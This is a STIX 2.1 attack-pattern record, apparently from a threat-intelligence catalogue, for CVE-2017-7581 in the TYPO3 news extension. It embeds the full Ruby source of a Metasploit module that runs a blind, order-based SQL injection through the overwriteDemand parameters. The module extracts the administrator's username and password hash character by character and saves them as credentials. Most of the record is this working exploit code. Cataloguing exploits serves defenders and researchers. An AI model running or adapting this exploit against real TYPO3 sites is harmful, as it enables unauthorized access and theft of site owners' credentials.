{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--90cf087b-5663-4476-ab3d-759a621b0996",
    "created": "2024-08-14T16:23:38.571433Z",
    "modified": "2024-08-14T16:23:38.571437Z",
    "name": "TYPO3 News Module SQL Injection",
    "description": " This module exploits a SQL Injection vulnerability In TYPO3 NewsController.php in the news module 5.3.2 and earlier. It allows an unauthenticated user to execute arbitrary SQL commands via vectors involving overwriteDemand and OrderByAllowed. The SQL injection can be used to obtain password hashes for application user accounts. This module has been tested on TYPO3 3.16.0 running news extension 5.0.0.  This module tries to extract username and password hash of the administrator user. It tries to inject sql and check every letter of a pattern, to see if it belongs to the username or password it tries to alter the ordering of results. If the letter doesn't belong to the word being extracted then all results are inverted (News #2 appears before News #1, so Pattern2 before Pattern1), instead if the letter belongs to the word being extracted then the results are in proper order (News #1 appears before News #2 so Pattern1 before Pattern2)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/typo3_news_module_sqli.rb",
            "external_id": "typo3_news_module_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7581"
        },
        {
            "source_name": "reference",
            "url": "http://www.ambionics.io/blog/typo3-news-module-sqli#Advisory"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TYPO3 News Module SQL Injection',\n        'Description' => %q{\n          This module exploits a SQL Injection vulnerability In TYPO3 NewsController.php\n          in the news module 5.3.2 and earlier. It allows an unauthenticated user to execute arbitrary\n          SQL commands via vectors involving overwriteDemand and OrderByAllowed. The SQL injection\n          can be used to obtain password hashes for application user accounts. This module has been\n          tested on TYPO3 3.16.0 running news extension 5.0.0.\n\n          This module tries to extract username and password hash of the administrator user.\n          It tries to inject sql and check every letter of a pattern, to see\n          if it belongs to the username or password it tries to alter the ordering of results. If\n          the letter doesn't belong to the word being extracted then all results are inverted\n          (News #2 appears before News #1, so Pattern2 before Pattern1), instead if the letter belongs\n          to the word being extracted then the results are in proper order (News #1 appears before News #2,\n          so Pattern1 before Pattern2)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Marco Rivoli', # MSF code\n          'Charles Fol' # initial discovery, POC\n        ],\n        'References' => [\n          ['CVE', '2017-7581'],\n          ['URL', 'http://www.ambionics.io/blog/typo3-news-module-sqli'] # Advisory\n        ],\n        'Privileged' => false,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'DisclosureDate' => '2017-04-06'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path of TYPO3', '/']),\n        OptString.new('ID', [true, 'The id of TYPO3 news page', '1']),\n        OptString.new('PATTERN1', [false, 'Pattern of the first article title', 'Article #1']),\n        OptString.new('PATTERN2', [false, 'Pattern of the second article title', 'Article #2'])\n      ]\n    )\n  end\n\n  def dump_the_hash(patterns = {})\n    ascii_charset_lower = 'a'.upto('z').to_a.join('')\n    ascii_charset_upper = 'A'.upto('Z').to_a.join('')\n    ascii_charset = \"#{ascii_charset_lower}#{ascii_charset_upper}\"\n    digit_charset = '0'.upto('9').to_a.join('')\n    full_charset = \"#{ascii_charset}#{digit_charset}$./\"\n\n    username = blind('username', 'be_users', 'uid=1', ascii_charset, digit_charset, patterns)\n    print_good(\"Username: #{username}\")\n    password = blind('password', 'be_users', 'uid=1', full_charset, digit_charset, patterns)\n    print_good(\"Password Hash: #{password}\")\n\n    connection_details = {\n      module_fullname: fullname,\n      username: username,\n      private_data: password,\n      private_type: :nonreplayable_hash,\n      workspace_id: myworkspace_id\n    }.merge!(service_details)\n    credential_core = create_credential(connection_details)\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      workspace_id: myworkspace_id\n    }.merge(service_details)\n    create_credential_login(login_data)\n  end\n\n  def blind(field, table, condition, charset, digit_charset, patterns = {})\n    # Adding 9 so that the result has two digits, If the lenght is superior to 100-9 it won't work\n    offset = 9\n    size = blind_size(\"length(#{field})+#{offset}\",\n                      table,\n                      condition,\n                      2,\n                      digit_charset,\n                      patterns)\n    size = size.to_i - offset\n    vprint_status(\"Retrieving field '#{field}' string (#{size} bytes)...\")\n    data = blind_size(field,\n                      table,\n                      condition,\n                      size,\n                      charset,\n                      patterns)\n    data\n  end\n\n  def select_position(field, table, condition, position, char)\n    payload1 = \"select(#{field})from(#{table})where(#{condition})\"\n    payload2 = \"ord(substring((#{payload1})from(#{position})for(1)))\"\n    payload3 = \"uid*(case((#{payload2})=#{char.ord})when(1)then(1)else(-1)end)\"\n    payload3\n  end\n\n  def blind_size(field, table, condition, size, charset, patterns = {})\n    str = ''\n    for position in 0..size\n      for char in charset.split('')\n        payload = select_position(field, table, condition, position + 1, char)\n        if test(payload, patterns)\n          str += char.to_s\n          break\n        end\n      end\n    end\n    str\n  end\n\n  def test(payload, patterns = {})\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'vars_get' => {\n          'id' => datastore['ID'],\n          'no_cache' => '1'\n        },\n        'vars_post' => {\n          'tx_news_pi1[overwriteDemand][OrderByAllowed]' => payload,\n          'tx_news_pi1[search][maximumDate]' => '', # Not required\n          'tx_news_pi1[overwriteDemand][order]' => payload,\n          'tx_news_pi1[search][subject]' => '',\n          'tx_news_pi1[search][minimumDate]' => '' # Not required\n        }\n      })\n    rescue Rex::ConnectionError, Errno::CONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n    if res && res.code == 200 && !(res.body.index(patterns[:pattern1]).nil? || res.body.index(patterns[:pattern2]).nil?)\n      return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])\n    end\n\n    false\n  end\n\n  def try_autodetect_patterns\n    print_status('Trying to automatically determine Pattern1 and Pattern2...')\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'vars_get' => {\n          'id' => datastore['ID'],\n          'no_cache' => '1'\n        }\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n      return '', ''\n    end\n\n    if res && res.code == 200\n      news = res.get_html_document.search('div[@itemtype=\"http://schema.org/Article\"]')\n      pattern1 = news[0].nil? ? '' : news[0].search('span[@itemprop=\"headline\"]').text\n      pattern2 = news[1].nil? ? '' : news[1].search('span[@itemprop=\"headline\"]').text\n    end\n\n    if pattern1.to_s.eql?('') || pattern2.to_s.eql?('')\n      print_status(\"Couldn't determine Pattern1 and Pattern2 automatically, switching to user speficied values...\")\n      pattern1 = datastore['PATTERN1']\n      pattern2 = datastore['PATTERN2']\n    end\n\n    print_status(\"Pattern1: #{pattern1}, Pattern2: #{pattern2}\")\n    return pattern1, pattern2\n  end\n\n  def run\n    pattern1, pattern2 = try_autodetect_patterns\n    if pattern1 == '' || pattern2 == ''\n      print_error('Unable to determine pattern, aborting...')\n    else\n      dump_the_hash(pattern1: pattern1, pattern2: pattern2)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-06",
    "x_mitre_platforms": [
        "['php']"
    ]
}